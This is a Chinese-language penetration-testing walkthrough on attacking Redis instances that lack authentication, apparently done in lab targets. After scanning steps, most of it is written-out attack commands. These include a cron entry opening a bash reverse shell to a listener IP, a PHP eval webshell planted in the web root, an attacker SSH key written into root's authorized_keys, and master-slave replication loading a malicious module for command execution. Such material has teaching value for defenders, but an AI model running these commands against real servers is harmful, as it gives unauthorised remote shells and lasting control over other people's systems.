## Redis未授权访问漏洞

## Redis本地检查

在本地使用redis-cli连接

```bash
redis-cli
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/09f180a5ef8b.png)

检查配置项

```bash
config get requirepass
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/0e7434731575.png)

## curl命令测试

```bash
curl dict://10.3.4.101:6379/info
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/913d91e65afd.webp)

## 客户端访问测试

```bash
redis-cli -h 10.3.4.101
get *
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/18cceb0e8367.webp)

## fscan扫描测试

```bash
.\fscan64.exe -h 10.3.4.101
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/b5714c52a99f.png)

## msf扫描测试

```bash
use auxiliary/scanner/redis/redis_login
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/3c694d7c5438.png)

## Redis反弹shell

**1.本地开启端口监听**

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/dcd394d4901b.png)

**2.通过Redis写入功能将反弹shell写入定时任务中**

```sql
flushall
--清除所有数据库的所有key
set x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/192.168.11.109/1234 0>&1\n"
--创建一个key-value对，键名为“x”，值为要写入的定时任务的内容
config set dir /var/spool/cron
--指定数据存储的路径
config set dbfilename root
--指定数据存储的文件名
save
--存储数据
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/3000e1b44672.png)

**3.接收到shell**

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/cdec7cc55b75.webp)

## Redis写入Webshell

**通过Redis将webshell写入Web目录下**

```bash
redis-cli -h 10.3.4.129
10.3.4.129:6379> set webshell "\n\n\n<?php eval($_REQUEST[1]); ?>\n"
OK
(3.15s)
10.3.4.129:6379> config set dir /var/www/html
OK
10.3.4.129:6379> config set dbfilename shell.php
OK
(2.93s)
10.3.4.129:6379> save
OK
(0.78s)
10.3.4.129:6379> exit
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/97616281a64d.png)

**访问Webshell并执行命令**

```bash
curl "http://10.3.4.129/shell.php?1=system('id');" --output -
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/73bd33c28482.png)

## Redis SSH公钥利用

## SSH登录方式

ssh [-p port] user@192.168.1.2 //使用用户名密码登录

ssh -i id_rsa root@192.168.1.2 //使用私钥登录

**私钥的生成**

ssh-keygen -t rsa

cd /root/.ssh

cp id_rsa.pub authorized_keys

chmod +x authorized_keys

cat id_rsa

将里面的内容复制到本机,命名为id_rsa //其中id_rsa为私钥 id_rsa.pub为公钥

## 生成SSH密钥对

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a802d08b5b39.png)

## 写入SSH公钥

通过Redis将SSH公钥写入authorized_keys文件中

```bash
cat /root/.ssh/id_ed25519.pub
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/9b0fed1072ad.png)

```bash
redis-cli -h 10.3.4.131
10.3.4.131:6379> config set dir /root/.ssh
OK
(1.98s)
10.3.4.131:6379> config set dbfilename authorized_keys
OK
10.3.4.131:6379> set x "\n\n\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIATN5mrkJygxFDJ5hvlNFGyFxV65soDbpwQjxHhcU17Q root@kali\n\n"
OK
10.3.4.131:6379> save
OK
10.3.4.131:6379>
```

```
由于公用靶场容易影响，后面是本地部署靶场，命令相同
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/931a65c52a80.webp)

## Redis主从复制利用

• 定时任务反弹shell

条件：存在定时任务服务

• Webshell写入

条件：存在Web服务，且知道Web路径

• SSH公钥写入

条件：存在SSH服务，且存在.ssh文件夹

在docker环境中，仅有纯净的Redis服务时，无法通过文件写入的方式getshell

在2019年7月7日结束的WCTF2019 Final上，LC/BC的成员Pavel Toporkov提出

了一种Redis新版本的Getshell方式，即利用Redis主从节点的同步功能。

当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式。主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。

```
模拟一个主节点，让从节点获取恶意服务
```

首先在服务器使用python脚本开启一个恶意的redis服务端

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/d475a69a1445.png)

1、指定写入文件目录：

config set dir /tmp

2、 写入文件名字：

config set dbfilename exp.so

3、指定复制的服务端ip端口

slaveof ip 6379

4、加载复制过来的so文件

module load /tmp/exp.so

5、执行命令

system.exec 'whoami'

6、取消slave

slaveof no one

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/2af88f7b110d.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/87c4e76ca014.png)
